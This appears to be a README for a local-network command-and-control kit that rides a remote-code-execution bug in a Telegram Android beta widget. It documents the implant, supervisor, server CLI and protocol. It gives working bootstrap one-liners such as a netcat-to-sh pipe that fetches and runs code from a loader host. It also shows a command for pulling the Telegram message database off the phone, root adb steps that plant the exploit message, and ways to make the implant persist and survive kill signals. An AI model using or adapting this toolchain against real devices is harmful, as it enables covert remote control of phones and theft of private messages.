# Local-only C2 for the Telegram Android widget RCE

Post-exploitation command-and-control for the existing `system()` RCE in
`org.telegram.messenger.beta` (13.2.0 / 72789-72799, Sony XQ-BT52, Android 13).
It runs **as the Telegram app UID** (`u0_a357`), with **no root**, and binds
**only to loopback or the trusted LAN** (`<LAN_IP>` / `127.0.0.1`).
It never talks to the internet and does not need `wget`/`curl`.

This is not a new exploit and not a persistence mechanism. It is the durable
control channel that the one-shot widget `system()` call starts.

**Device status (2026-11-02 01:35, token NIGHT4):** the bundle-native re-arm
worked: the loader served the bootstrap ~30 times, the phone fetched it, and a
control TCP connection opened, but no `hello` completed. The log pattern
(`session 1 closed (peer closed)` then `connection ... did not send hello`) is
consistent with the bootstrap storm: every widget engine boot ran a bootstrap
that killed the previous supervisor/implant, sometimes inside the old 0.4 s
connect window, and a new supervisor could lose the `sup.lock` race to a dying
one. The fixes in this revision are:

* a build sentinel + bootstrap lock: only the first fetch of a build installs;
  the rest answer `C2_ALREADY_RUNNING` / `C2_BOOTSTRAP_BUSY`,
* the implant sends `hello` immediately after `nc` starts (no settle window),
* implant/supervisor locks and an upgrade kill/wait that clears stale locks,
* a `/proc` sweep for untracked implants left by a storm,
* a `C2_DIAG=1` mode + server `welcome`, so the next device run can prove
  hello independently of the command loop,
* the token/id/build are sent unescaped from a safe charset; only free-form
  device metadata goes through `tr`, so a `tr` issue cannot empty the token.

**Device diag (2026-11-02 01:56, 02:12):** `diag.out` had `DIAG_START` only
and the server saw **no control connection**. The 02:12 stage trace stopped at
`stage=cn-nc-cmd`, i.e. inside the setup of

```sh
toybox nc <LAN_IP> 4444 < "$OUT" > "$IN" &
```

The app-UID shell is mksh: it sets up a background command's redirections
before running the next command. `> "$IN"` blocks because IN has no open
reader at that moment; `cat "$IN"` (the reader) is the next command and is
never reached. The earlier watcher never hit this because it pre-opened
**both** FIFOs O_RDWR in the parent:

```sh
exec 8<> "$IN"      # 8 is the IN reader/writer the nc >IN open needs
exec 9<> "$OUT"     # 9 is the OUT reader/writer nc's stdin needs
```

Our transport had opened only OUT, so the IN write blocked. Both FIFOs are now
pre-opened before `nc`; `exec 8<>`/`9<>` are non-blocking on Android (proven by
the earlier watcher). The trace records `cn-fd8`, `cn-fd9`, `cn-nc-fork`,
`cn-nc-pid`, `cn-cat-fork`, `cn-cat-pid`, plus a durable stage log
(`$D/diag.trace`), `DIAG_ERR` lines, a 25 s watchdog, and optional `set -x`.
**Device diag (02:18):** with the fd pair the trace stopped at `cn-begin`,
before `rm`/`mkfifo`/the fd opens. The sh disappeared, the app stayed alive,
and the bootstrap's `boot.lock` was left behind; the diag was killed, not
blocked. Unlike the supervisor/implant (both started with `setsid`), the diag
ran as a plain child of the bootstrap, so a teardown/group signal took it
down. The diag now:

* is started with `setsid` (its own session, like the supervisor/implant);
* logs and **ignores** HUP/TERM/INT (`stage=sig ... (ignored)`), so only the
  watchdog's SIGKILL or the diag's own bounded waits stop it;
* has an EXIT trap (`stage=exit rc=...`) and, when the shell supports it
  (mksh does; dash does not), an ERR trap (`stage=err rc=... line=...`);
* traces the first commands with begin/end pairs: `cn-rm-begin`/`cn-rm`,
  `cn-mkfifo-begin`/`cn-mkfifo`, `cn-fd8-begin`/`cn-fd8`,
  `cn-fd9-begin`/`cn-fd9`.

If the diag is SIGKILLed (LMK, `kill(-1)`, per-UID teardown) the EXIT trap
cannot run; the trace then stops at the last completed stage. A cgroup freeze
also stops the trace; the README calls both out.

The diagnostic was exercised under host mksh R59 as well as dash/busybox; the
host suite is 91 checks. The next device step is §5.2. No phone or emulator
was used for this revision.

```
c2/
├── server/
│   ├── c2_server.py       TCP listener, sessions, CLI, --cmd batch, loader
│   └── c2common.py        bootstrap renderer, local-only bind/peer checks
├── implant/
│   ├── implant.sh         POSIX sh + toybox implant (app UID, no root)
│   └── supervisor.sh      watchdog: restarts implant, notices app PID change
├── mock/
│   └── mock_implant.sh    host-only wrapper (fake uid line, real protocol code)
├── tools/
│   ├── make_bootstrap.py  print the exact system() command
│   ├── patch_payload.py   swap the endgame command in an exploit payload
│   └── make_loader_4096.py  rebuild the bot-size LZSS/AES loader
├── run_local_test.sh      host end-to-end test (91 checks)
├── run_widget_e2e.sh      real widget -> system(bootstrap) -> mock C2 (11 checks)
└── README.md
```

## 1. Quick start (host only, no phone)

```sh
cd telegramandroidwidget/c2
./run_local_test.sh
# ...
# PASS (91 checks)
```

The test starts the server, two mock implants, exercises hello/ping/exec/
put/get/reconnect/sleep/bye, runs the real loader-bootstrap pipeline through
`nc | sh`, runs the `C2_DIAG=1` diagnostic through the loader, fires repeated
bootstraps to prove the storm lock (`C2_BOOTSTRAP_BUSY`/`C2_ALREADY_RUNNING`),
proves the direct implant lock, kills a server under a live implant to prove
reconnection, and checks the bind-safety refusals. Everything is `127.0.0.1`,
nothing leaves the host. A work directory is kept under
`/tmp/opencode/c2test.*` for inspection.

Manual host run:

```sh
python3 server/c2_server.py \
  --host 127.0.0.1 --port 4444 --loader-port 5555 --token demo

# in another shell: the mock implant (real protocol, fake identity)
C2_HOST=127.0.0.1 C2_PORT=4444 C2_TOKEN=demo C2_ID=mock1 \
  C2_DIR=/tmp/opencode/mock1 ./mock/mock_implant.sh
```

## 2. Server

```sh
# loopback only (default)
python3 server/c2_server.py

# the real LAN case
python3 server/c2_server.py \
  --host <LAN_IP> --allow-lan \
  --port 4444 --loader-port 5555 \
  --token '<random-shared-token>'
```

Defaults: control `4444`, loader `5555` (the prior reverse-shell port).
If you prefer the adjacent pair, use `--loader-port 4445` and target that port
in the bootstrap command.

| CLI command | meaning |
|---|---|
| `sessions` / `ls` | list live and dead sessions |
| `sessions clean` / `prune` | remove dead sessions from the table |
| `sessions clear` | remove **all** sessions (closes live ones) |
| `drop <sid\|implant\|all>` | remove one session (or all) |
| `use <sid\|implant>` | select the active session |
| `info` | hello metadata for the active session |
| `ping` | round-trip check |
| `exec <cmd>` / `!<cmd>` | run `sh -c` as the app UID; stdout+stderr+rc |
| `<cmd>` | auto-shell: same as `exec <cmd>` for unrecognized lines |
| `put <local> <remote>` | upload (single message, or chunked when large) |
| `get <remote> [local]` | download into `downloads/` (sha256 verified) |
| `sleep <secs>` | ask the implant to pause (0..3600) |
| `reconnect [delay]` | drop the socket and wait for the new session |
| `bye [stop]` | close; `stop` also stops the supervisor |
| `broadcast exec <cmd>` | run on every live session |
| `wait <secs> [count]` | wait for `count` sessions (default 1) |
| `pause <secs>` | host-side sleep for batch scripts (no implant traffic) |
| `history [n]` / `log [n]` | command history / this run's log |
| `quit` / `exit` | stop the server |

Auto-shell is enabled by default: the first live session is selected
automatically and every line that is not a C2 command is executed as a shell
command on it (use `--no-auto-shell` to restore the old strict parser).
Dead sessions are pruned automatically when a new implant connects
(`--no-prune-dead-on-connect` keeps them); `prune` / `sessions clear` remove
them on demand.

Batch mode (no interactive prompt):

```sh
python3 server/c2_server.py --host <LAN_IP> --allow-lan --token T \
  --wait-session 120 \
  --cmd "sessions" \
  --cmd "exec id; getprop ro.product.model" \
  --cmd "get /data/user/0/org.telegram.messenger.beta/files/cache4.db" \
  --cmd "bye" --cmd quit

# or one command per line, '#' comments allowed
python3 server/c2_server.py --script ops.txt
```

`--print-bootstrap` prints the exact 80-char `system()` string and exits (no
listener is opened); `tools/make_bootstrap.py` does the same with validation.

`--bootstrap-diag` changes only what the loader serves: instead of installing
and starting the supervisor, the script runs `C2_DIAG=1 implant.sh` once
under a 25 s watchdog in its own **setsid** session (both-FIFO O_RDWR transport → fixed hello → wait for
`welcome` → exit) and writes `$D/diag.out` plus the durable stage log
`$D/diag.trace`. It never kills or starts the full C2 and is the first device
test (§5.2). `--diag-xtrace` adds `set -x` to the trace.

### Local-only guarantees

* `--host` must be loopback or RFC1918/link-local. `0.0.0.0` and public
  addresses are refused. A LAN bind additionally requires `--allow-lan`.
* Every accepted peer must have a private/loopback source address; public
  peers are dropped on both ports, even if the bind address is wrong.
* The server opens **no outbound connections**. Implants dial in; the loader
  port only answers a client that connects to it.
* `--token` is embedded in the loader-served implant and checked in `hello`.
  It is optional but recommended; without it any local process can
  impersonate an implant. The loader port itself has no TCP auth, so keep it
  on the trusted LAN (or firewall it); a LAN peer that fetches the bootstrap
  learns the token.
* Logs redact base64 payloads by default (`--log-payloads` to include them).

### Logs and downloads

Each run creates `logs/run-YYYYmmdd-HHMMSS/`:

| file | content |
|---|---|
| `c2.log` | human-readable events with timestamps |
| `history.jsonl` | every CLI command, session, ok/fail, detail |
| `session-N.jsonl` | protocol events for session N (hello/exec/put/get/bye; chunk payloads omitted) |

Downloads go to `downloads/` (mode 0600, unique suffix if the name exists,
sha256 checked against the implant's `file_done`). `--allow-any-output` is
needed to write outside that directory.

The human log records the text of every `exec` command; it is as sensitive as
the shell history. Base64 payloads are redacted unless `--log-payloads`.

## 3. Protocol

One JSON object per line. The server's values are always strings; the implant
parses only string fields and base64-decodes commands and paths, so no shell
metacharacter can break the framing. Lines are capped at 8 MiB.

Server → implant:

| op | fields | reply |
|---|---|---|
| `welcome` |; (sent first, after hello) | `session`, `build`, `ts` |
| `ping` | `id` | `pong` |
| `exec` | `id`, `cmd`(b64), `timeout`, `max_out` | `out`/`err` chunks, then `done` |
| `put` | `id`, `path_b64`, `b64`, `size`, `sha256` | `put_done` / `error` |
| `put_begin` | `id`, `path_b64`, `size`, `sha256` | `put_ready` |
| `put_chunk` | `id`, `seq`, `b64` | - |
| `put_end` | `id`, `sha256` | `put_done` / `error` |
| `get` | `id`, `path_b64` | `file` chunks, then `file_done` |
| `sleep` | `id`, `secs` | `slept`, then the pause |
| `reconnect` | `id`, `delay` | `ack`, close, reconnect |
| `bye` | `id`, `stop` | `ack`, close (and optionally stop) |

Implant → server: `hello` (implant id, uid, user, device, android, app, app
pid, token, version, **build**), `pong`, `out`/`err` (`id`, `seq`, `b64` line
chunks), `done` (`rc`, line/byte counts, `trunc`, `timeout`),
`file`/`file_done` (sha256), `put_ready`/`put_done`, `slept`, `ack`, `event`
(app restart), `error`.

The server sends `welcome` immediately after accepting a valid hello. This is
the diagnostic's positive reply (`DIAG_RX`) and the full implant logs
`WELCOME session=... build=...`; it proves both directions without waiting for
the first ping.

`exec` is line-oriented and live: the implant runs `sh -c <cmd>` in its own
session, writes stdout/stderr to files, and streams new complete lines while
the command runs; the CLI prints each chunk as it arrives. A final line
without `\n` is sent when the command exits.
`rc` is the real exit status; `trunc=1` means the per-stream cap was hit and
the process group was killed; `timeout=1` means the timeout fired (the
implant's `toybox timeout`, or the main-loop backstop). Binary output should
be base64-encoded inside the command or fetched with `get`.

`sleep` is a real blocking pause: the implant acks first, then sleeps; the
server suppresses pings for that session until the pause ends. Commands sent
during the pause are buffered in the socket/FIFO and processed afterwards.

### Keepalive, and why it matters

The transport is `toybox nc` with two FIFOs. Both are pre-opened O_RDWR in the
parent before `nc`/`cat` are started:

```sh
exec 8<> "$IN"      # reader/writer for IN
exec 9<> "$OUT"     # reader/writer and the writer that keeps nc stdin open
toybox nc H P < "$OUT" > "$IN" &
cat "$IN" >> "$CMDQ" &
```

The `> "$IN"` redirection is satisfied by fd 8 and `< "$OUT"` by fd 9, so
mksh can set up the background redirections without blocking (device 02:12:
without fd 8, the shell stopped exactly there and never reached `cat`). fd 9
is also the writer that keeps stdin open, so `nc` never sees EOF between
sends. Toybox `nc` **exits as soon as stdin hits EOF**, and it does **not**
exit when the remote closes while stdin is still open. Consequences:

* the bootstrap must hold stdin open; hence `sleep 2|toybox nc ...|sh`;
* the implant cannot rely on socket EOF after a server restart, so the server
  pings every 30 s and the implant drops/reconnects after `C2_RX_TIMEOUT`
  (default 75 s) without a line. The test uses 4 s to exercise this. If you
  raise `--ping-interval`, raise `C2_RX_TIMEOUT` above it as well.
* a dead server during a huge `get` can wedge a blocking FIFO write; the
  supervisor's stale-heartbeat kill (`C2_STALE`, default 120 s) recovers it.

## 4. Implant

Installed state directory on the phone:

```
/data/user/0/org.telegram.messenger.beta/files/.c2/
├── implant.sh        protocol loop (rendered host/port/token/build)
├── supervisor.sh     watchdog
├── implant.pid       authoritative PID (only after the implant lock)
├── implant.lock/pid  single-instance implant lock
├── sup.pid / sup.lock
├── build             build sentinel (sha256 prefix of the served scripts)
├── boot.lock/pid     bootstrap serialization
├── hb                heartbeat epoch
├── implant.log / sup.log / implant.out / sup.out
├── diag.out          C2_DIAG=1 output (diag bootstrap)
├── diag.trace        durable stage trace (always) / set -x (optional)
├── diag.stamp        build that already ran the diag
├── stop              written by `bye stop`; both processes exit
└── restart           written by the supervisor on an app PID change
```

The implant runs as the app UID, uses only `/system/bin` toybox applets,
has no `su`/root path, and touches only the app's own data directory. It
reconnects with exponential backoff (1→30 s) and re-hellos after an app
restart. `hello` is written immediately after `nc` starts; it can sit in the
FIFO buffer while the TCP connection is still being set up, which removes the
old 0.4 s kill window.

The supervisor:

* restarts the implant if it dies (backoff 1→30 s) or stops updating `hb`;
* watches `pidof org.telegram.messenger.beta` and, on a PID change, writes
  `restart` so the implant drops the old socket and re-hellos with the new
  app PID;
* takes a lock (`sup.lock`) so only one supervisor runs;
* exits on `stop`.

The diagnostic (`C2_DIAG=1`) is started by the bootstrap with `setsid`, in its
own session like the supervisor/implant. It logs and ignores HUP/TERM/INT
(`stage=sig ... (ignored)`), has EXIT/ERR traps, and keeps its own bounded
waits. A teardown signal aimed at the bootstrap's process group therefore
does not take the diag with it; only SIGKILL or the 25 s watchdog stops it.

### Re-arm storm and single-instance behavior

Every widget engine boot runs the served bootstrap, so a chat scroll produced
~30 fetches in 12 s on 2026-11-02. The bootstrap now:

1. takes `boot.lock`; a concurrent fetch answers `C2_BOOTSTRAP_BUSY` and exits;
2. if `build` matches and a live supervisor exists, answers
   `C2_ALREADY_RUNNING` and exits; no kill, no new implant;
3. on a real build change (new token/port/code), kills the old supervisor and
   implant, waits up to 5 s (the supervisor defers TERM while sleeping), kills
   leftovers, removes `sup.lock`/`implant.lock`, sweeps `/proc` for any
   untracked `$D/implant.sh`/`$D/supervisor.sh`, then installs and starts;
4. writes `build` only after the supervisor publishes `sup.pid`, so a fetch
   racing the first install sees the boot lock or a live supervisor, never a
   half-installed tree.

The implant itself also takes `implant.lock` and writes `implant.pid` only
after winning it; a duplicate cannot clobber the live PID. The supervisor no
longer pre-writes `implant.pid` for the same reason.

### Android toybox 13 audit

The protocol loop avoids `read -t`, `mktemp`, `flock`, `stat`, `jq` and
`nohup`; the socket is polled by appending to a spool file and using
`wc`/`sed`. This is the utility list on the device (all are in Android 13
toybox unless noted):

| utility | use | if unavailable |
|---|---|---|
| `toybox nc` | transport (control and loader) | required; no fallback |
| `base64` | exec/put/get payloads | probe → `base64` in PATH; hello still works without it |
| `sha256sum` | put/get verification | probe → `sha256sum`; verification is skipped when the digest is empty |
| `timeout` | exec deadline | probe disables it; the main loop kills at `timeout+5 s` |
| `mkfifo` | control FIFOs | required |
| `dd` | `get` chunks (`bs/skip/count`) | probe → `dd` in PATH |
| `sed` | JSON field extraction, chunks | required for the command loop |
| `tr` | base64 flattening, `jesc`, cmdline | hello metadata may be empty, but token/id/build are raw safe charset |
| `tail` | partial-line flush, log rotation | final partial line is not sent; transfers still work |
| `wc`, `cut`, `date`, `id`, `getprop`, `pidof`, `cat`, `mkdir`, `rm`, `mv`, `chmod`, `sleep`, `setsid`, `kill` | general | toybox/base system |

The only shell-specific features used are POSIX plus the watcher's FIFO
pattern; `exec 8<>IN` and `exec 9<>OUT` (O_RDWR, non-blocking), then
`nc <OUT >IN &` and `cat IN >> CMDQ &`; and `trap ... 0`. Both pre-opens are
load-bearing on mksh: without fd 8, the `>IN` redirection blocks before `cat`
starts (device 02:12). The host suite runs the same scripts under dash and
busybox `sh`.

Knobs (environment, inherited by the supervisor/implant): `C2_RX_TIMEOUT`
(default 75), `C2_STALE` (120), `C2_DIR`, `C2_SH`, `C2_MOCK`, `C2_MOCK_UID`,
`C2_MOCK_USER`, `C2_MOCK_DEVICE`. `C2_MOCK=1` fakes the identity and uses host
`nc`/`base64`; `mock/mock_implant.sh` is the host entry point and refuses to
run on a device by accident.

## 5. Deployment on the Sony (device test later)

### 5.0 Short loopback bootstrap (<=50 bytes): c2560s_c2 widget

The universal c2560s final (72929, B=7,182, zlib9 4,023) has a **50-byte
`system()` command field**.  The C2 delivery uses this 44-char bootstrap:

```sh
python3 tools/make_bootstrap.py --host 127.0.0.1 --port 5555 --nc
# RCE command (44 chars):
# setsid sh -c 'sleep 5|nc 127.0.0.1 5555|sh'&
```

It is embedded in
`lab/qjs_fork_audit/zeroday_hunt_parser/device/widget/c2560_final_c2560s_c2_72929.html`
(9,946 raw / **4,025 zlib9**, A/B/C = 2,228/7,182/408).  The command field is
padded to 50 bytes with trailing spaces, so the stage-B script length stays
exactly 7,182 and the device-proven `S1 SAFE2560C` probe at B=7,182 still
applies.  Only the command literal changes; stage A and stage C are
byte-identical to the device-proven final.

Why each part is safe on the Sony (Android 13, app UID 10346):

| part | evidence |
|---|---|
| `setsid ... &` | returns in ~1 ms (host `sh -c` measurement) while the pipeline survives; `setsid` + `&` is the form device-proven on 2026-11-02 (loader served 39,348 B, `exec id` returned `uid=10357 ... untrusted_app`) |
| `sleep 5` | toybox applet; holds toybox `nc` stdin open so it does not exit on the 64 KiB pipe EOF before the loader writes. 5 s is extra margin over the proven 2-3 s gate |
| `nc 127.0.0.1 5555` | `/system/bin/nc` is a toybox symlink (verified on the Sony); PATH contains `/system/bin`. Only PATH applets, no `/system/bin/toybox` prefix |
| `| sh` | mksh executes the ~39 KB bootstrap served on the loader port |

Toybox compatibility was checked three ways: the Android-13 applet audit in
§4 (`nc`, `sleep`, `setsid`, `sh` all present), the device proofs above, and a
host applet-dispatch proxy in `run_local_test.sh` phase 7 (busybox symlinks
`nc`/`sleep`/`setsid` on PATH; same `argv[0]` mechanism toybox uses).  The
suite asserts length <=50, the exact string, PATH-only applets, `sh -n`, and
that the outer `sh -c '<cmd>'` (the `system()` semantics) returns in <2 s
while the fetch/hello/exec still complete (91 checks).

The `toybox nc` absolute form **cannot** be used here: even with the shortest
sleep it is 51 bytes (`setsid sh -c 'sleep 2|toybox nc 127.0.0.1 5555|sh'&`),
one over the 50-byte field.  The bare `nc` symlink is therefore load-bearing
for this widget; it is the one element verified on the Sony but not yet
exercised in a C2 run.  If it ever fails, the command does not fit the field
and the #1865-style loader (larger command buffer) is the fallback.

Loopback + `adb reverse` (no LAN, no tunnel):

```sh
# host
python3 server/c2_server.py --host 127.0.0.1 --port 4444 --loader-port 5555 \
    --bootstrap nc --token <TOKEN> --log-dir logs --download-dir downloads
# device (orchestrator)
adb -s <SERIAL> reverse tcp:4444 tcp:4444
adb -s <SERIAL> reverse tcp:5555 tcp:5555
```

The implant dials `127.0.0.1:4444`; the widget's bootstrap dials
`127.0.0.1:5555`.  Both are loopback inside the phone and reach the host only
through the adb reverse sockets.  Every free re-runs `system()` (the hook is
`mf.js_free = system`), so expect several loader fetches per widget run; the
bootstrap's build sentinel answers `C2_ALREADY_RUNNING` for the duplicates.

Host end-to-end (`run_widget_e2e.sh`, 11 checks) runs the exact widget chain
through the app-like sibling-script harness: stage A forges the 327,744-byte
AB, stage B reports `HF OK`, teardown calls `system(bootstrap)`, the loader
serves ~39.8 KB, the mock implant says hello, `exec id` returns, `bye stop`
cleans up.  The **device** widget's endgame is calibrated for the device heap
and stops at `HF ERR NOANCHOR` on the host by design; the host twin
`c2560_final_c2560s_c2_host.html` (same A/C, same 44-char command, B=7,182)
is the host validation vehicle.

### 5.0.1 Exact Sony run (Telegram DB delivery)

All commands below are host-side except the marked `adb shell` ones.  The
orchestrator owns every device operation.

```sh
cd <HOME>/ailocal/Telegram/telegramandroidwidget
TOKEN=s0ny72929c2            # any [A-Za-z0-9._-] token

# 1) host C2 server: loopback only, loader 5555, control 4444
python3 c2/server/c2_server.py --host 127.0.0.1 --port 4444 \
    --loader-port 5555 --bootstrap nc --token "$TOKEN" \
    --log-dir c2/logs --download-dir c2/downloads \
    --wait-session 180 \
    --cmd sessions --cmd "exec id" \
    --cmd "exec getprop ro.build.version.release" \
    --cmd "exec ls -l /data/user/0/org.telegram.messenger.beta/files/.c2" \
    --cmd "pause 15" --cmd "bye stop" --cmd quit

# 2) device port forwarding (loopback on the phone -> host listeners)
adb -s <SERIAL> reverse tcp:4444 tcp:4444
adb -s <SERIAL> reverse tcp:5555 tcp:5555

# 3) build the delivery DB from the current base (copy, never edit the base).
#    Base: the lab base below, or a fresh pull of the live DB:
#      adb -s <SERIAL> exec-out 'su -c "cat /data/user/0/org.telegram.messenger.beta/files/cache4.db"' \
#          > /tmp/opencode/c2_72929.db
#    build_db.py inserts a fixed MID 80345 in chat UID <CHAT_ID>, so the old
#    row must go first (a plain INSERT fails on the UNIQUE(mid,uid)).
cp lab/qjs_n1/db/final_base_20261107.db /tmp/opencode/c2_72929.db
sqlite3 /tmp/opencode/c2_72929.db \
  "DELETE FROM messages_v2 WHERE mid=80345 AND uid=<CHAT_ID>;"
python3 lab/qjs_n1/db/build_db.py /tmp/opencode/c2_72929.db \
  lab/qjs_fork_audit/zeroday_hunt_parser/device/widget/c2560_final_c2560s_c2_72929.html
# -> raw 9946 zlib 4025 blob 4100: rows: [(80345, <CHAT_ID>, 4100)]

# 4) swap the DB into the app (root: app UID 10346)
adb -s <SERIAL> push /tmp/opencode/c2_72929.db /sdcard/c2_install.db
adb -s <SERIAL> shell 'su -c "am force-stop org.telegram.messenger.beta; \
  cat /sdcard/c2_install.db > /data/user/0/org.telegram.messenger.beta/files/cache4.db \
  && rm -f /data/user/0/org.telegram.messenger.beta/files/cache4.db-wal \
           /data/user/0/org.telegram.messenger.beta/files/cache4.db-shm \
  && chown 10346:10346 /data/user/0/org.telegram.messenger.beta/files/cache4.db \
  && chmod 600 /data/user/0/org.telegram.messenger.beta/files/cache4.db \
  && chcon u:object_r:app_data_file:s0:c90,c257,c512,c768 /data/user/0/org.telegram.messenger.beta/files/cache4.db \
  && rm -f /data/user/0/org.telegram.messenger.beta/files/n1"'
# if the app's categories differ after the 72929 update, re-derive them from
# /proc/<pid>/attr/current and use that file context for chcon.

# 5) open the widget message (message 80345 in chat <CHAT_ID>)
adb -s <SERIAL> shell "am start -n org.telegram.messenger.beta/org.telegram.ui.LaunchActivity \
  -a android.intent.action.VIEW -d 'tg://openmessage?user_id=<CHAT_ID>&message_id=80345'"
```

Expected host log (one session; extra `loader: serving` lines are the
`mf.js_free = system` hook firing again, answered with `C2_ALREADY_RUNNING`):

```
loader listening on 127.0.0.1:5555
loader: serving 39784 bytes to 127.0.0.1
session 1 hello implant=tg-10346-XQ-BT52 uid=10346 user=u0_a346 \
    device=XQ-BT52 build=... from=127.0.0.1
exec id -> uid=10346(u0_a346) gid=10346(u0_a346) ... \
    context=u:r:untrusted_app:s0:c90,c257,c512,c768
```

If no hello arrives, check in order: `adb reverse --list` shows both ports;
the server log has `loader: serving` (bootstrap reached the host but the
implant did not dial 4444) vs no loader line (the widget command did not run:
check the stage-C marker `END=HF OK` and the widget payload size 4025 -> 9946
in logcat); `files/.c2/implant.log` and `sup.out` on the phone for the
implant's own reason (token/build/toybox).

### 5.0.2 Measured latency on the Sony (2026-11-08 15:00)

First open, 1/1 success, no NOCORR, loopback only.  The app-side chat open
(ActivityTaskManager `START`) to the server's `session 1 hello` was
**1.913 s** (1.960 s from the host `am start`; the device clock is 53 ± 10 ms
behind the host).  Breakdown: open → widget sandbox task start 459 ms,
sandbox task start → first `system()` fork 339 ms (stage A + stage B +
teardown; the release build does not log the JS `RESULT`/`HF OK` markers),
`system()` → loader accept 100 ms, loader accept → hello 1,016 ms.  The
loader served 39,787 bytes; `exec id` returned `uid=10346(u0_a346) ...
untrusted_app`; session `tg-10346-XQ-BT52`.

Exact commands, host-ms server log, ftrace markers/timeline and logcat
excerpt: `../evidence/c2_sony_c2560s_20261108/` and
`../notes/c2_widget_72929_20261107.md` (section "Measured device run -
2026-11-08 15:00").

### 5.1 The exact system() command

```sh
cd telegramandroidwidget/c2
python3 tools/make_bootstrap.py --host <LAN_IP> --port 5555 --token NIGHT4
# RCE command (80 chars):
# setsid sh -c '/system/bin/sleep 2|/system/bin/toybox nc <LAN_IP> 5555|sh' &
```

That string is what must replace the proof command in the widget payload. It
is 80 characters; the exploit's command buffer at `0x2000` holds it easily and
the compressed loader size barely moves. The served bootstrap is ~38 KB, well
inside the 64 KiB pipe buffer, so the whole script is buffered before the
`sleep 2` gate releases `nc`'s stdin. Every part is deliberate:

| part | why |
|---|---|
| `setsid ... &` | new session; `system()` returns immediately, the pipeline survives the app crash (proven in the reverse-shell PoC) |
| `/system/bin/sleep 2` | holds `toybox nc` stdin open; stdin EOF makes toybox nc exit before it reads the script |
| `/system/bin/toybox nc H P` | the only transport used; no `wget`, `curl`, `nc` symlink assumption |
| `| sh` | executes the bootstrap served on the loader port; `sh` never reads its own stdin for data (all commands are redirected) |

### 5.2 First device run: diagnostic (C2_DIAG=1)

This isolates hello from the full command loop. The loader serves a script
that runs the implant **once** in diagnostic mode; it does not start or kill
the supervisor.

```sh
# 1) host: diagnostic server (same host/ports/token as the real run)
python3 server/c2_server.py \
  --host <LAN_IP> --allow-lan \
  --port 4444 --loader-port 5555 \
  --token NIGHT4 --bootstrap-diag

# 2) phone: re-arm the bundle exactly as before.  No new exploit or command:
#    the existing boot path calls the 80-char system() string.
```

Expected server log (the server log is authoritative):

```
[..] loader: serving 38xxx bytes to <LAN_IP>
[..] session 1 hello implant=diag-10357 uid=10357 user=diag device=diag pid=... build=<hex> from=<LAN_IP>
[+] session 1: diag-10357 (diag@diag) from <LAN_IP>
```

On the phone, `$D/diag.out` must contain:

```
DIAG_START host=<LAN_IP> port=4444 build=<hex> uid=10357
DIAG_SENT op=hello implant=diag-10357 build=<hex>
DIAG_RX {"op":"welcome","id":"","session":"1","server":"c2","build":"<hex>",...}
```

and `$D/diag.trace` is the authoritative **stage** log (always on; each line
is appended and closed immediately, so a kill still leaves the last completed
stage):

```
stage=env d=/data/user/0/org.telegram.messenger.beta/files/.c2 sh=/system/bin/sh nc=/system/bin/toybox nc host=<LAN_IP> port=4444 sleep=/system/bin/sleep timeout=/system/bin/toybox timeout
stage=path path=/system/bin:...
stage=fd0 lr-x------ ... /proc/.../fd/0 -> /dev/null
stage=dir drwx------ ... ... /data/user/0/.../.c2
stage=write rc=0
stage=attempt 0
stage=cn-begin
stage=cn-rm-begin
stage=cn-rm rc=0
stage=cn-mkfifo-begin
stage=cn-mkfifo rc=0
stage=cn-fd8-begin
stage=cn-fd8 rc=0
stage=cn-fd9-begin
stage=cn-fd9 rc=0
stage=cn-nc-cmd /system/bin/toybox nc <LAN_IP> 4444 <.../.diag.out >.../.diag.in
stage=cn-nc-fork
stage=cn-nc-pid ...
stage=cn-cat-fork
stage=cn-cat-pid ...
stage=cn-settle
stage=cn-done
stage=send-begin len=238
stage=ds-begin
stage=ds-end rc=0
DIAG_SENT op=hello implant=diag-10357 build=<hex>
stage=wait-begin w=5
DIAG_RX {"op":"welcome",...}
stage=rx
stage=exit rc=0 line=...
```

If a teardown signal was delivered but ignored, the trace also has
`stage=sig HUP/TERM/INT (ignored)`. If the shell supports ERR (mksh does), a
failed command adds `stage=err rc=... line=...`.

`stage=fd0` must point to `/dev/null`: the bootstrap runs the diag with stdin
redirected, so it cannot consume the loader script. `stage=cn-nc-cmd` is the
exact `nc` argv. The bootstrap's stdout (if captured) has `DIAG_DONE rc=0`;
the bootstrap writes `diag.stamp` only on rc=0. To rerun the same build,
remove it first:

```sh
adb shell rm -f /data/user/0/org.telegram.messenger.beta/files/.c2/diag.stamp
# if the app is debuggable instead: adb shell run-as org.telegram.messenger.beta \
#   rm -f files/.c2/diag.stamp
```

Read both files via root/ADB (the Sony has root for the DB path):

```sh
adb shell su -c 'D=/data/user/0/org.telegram.messenger.beta/files/.c2; \
  echo ===diag.out===; cat "$D/diag.out"; echo ===diag.trace===; cat "$D/diag.trace"'
```

If the stage trace stops before `cn-done`, the last line identifies the
failing command:

| last trace / output | meaning |
|---|---|
| no `stage=write`, or `write rc!=0` | `$D` not writable by the app UID (check `stage=dir`) |
| `cn-begin` then no `cn-rm-begin` | the sh died between two writes: look for `stage=sig`/`stage=exit`; if neither, SIGKILL (LMK / kill(-1) / per-UID teardown) |
| `cn-rm-begin` then no `cn-rm` | the sh died inside `rm`; same signal/SIGKILL logic |
| `cn-mkfifo rc!=0` | FIFO creation denied, or the path exists as a non-FIFO |
| `cn-mkfifo` then no `cn-fd8` | `exec 8<>IN` failed (permission/FS) |
| `cn-fd8` then no `cn-fd9` | `exec 9<>OUT` failed (permission/FS) |
| `cn-fd9` then no `cn-nc-fork` | the nc redirection is still blocking even with both fds; check `cn-fd8/fd9 rc=0` and `stage=env nc=...` |
| `cn-nc-fork` then no `cn-nc-pid` | shell issue after fork (should be immediate) |
| `cn-nc-pid` then no `cn-cat-fork` | cat fork blocked |
| `cn-settle` then `DIAG_ERR nc_start/cat_start` | that child died immediately (toybox/applet issue) |
| `cn-done` then no `send-begin` | shell died/froze between setup and hello |
| `send-begin` then `ds-end rc=124` / `DIAG_ERR send rc=124` | hello write blocked: `nc` was not reading OUT |
| `DIAG_SENT` then no `wait-begin` | shell died/froze after the write |
| `wait-begin` then `DIAG_NO_REPLY` | hello went out, no `welcome`: token mismatch (server log), old server, or server closed |
| `stage=sig HUP/TERM/INT (ignored)` | a teardown signal was delivered; the diag keeps going (setsid blocks group signals; a per-UID/direct signal still reaches) |
| `stage=exit rc=N line=L` before `DIAG_SENT` | the diag exited normally with N; the preceding `stage=err` names the failed command |
| last stage then no `stage=exit`/`stage=sig` | SIGKILL (LMK, `kill(-1)`, per-UID teardown) or a cgroup freeze; check `ps` |
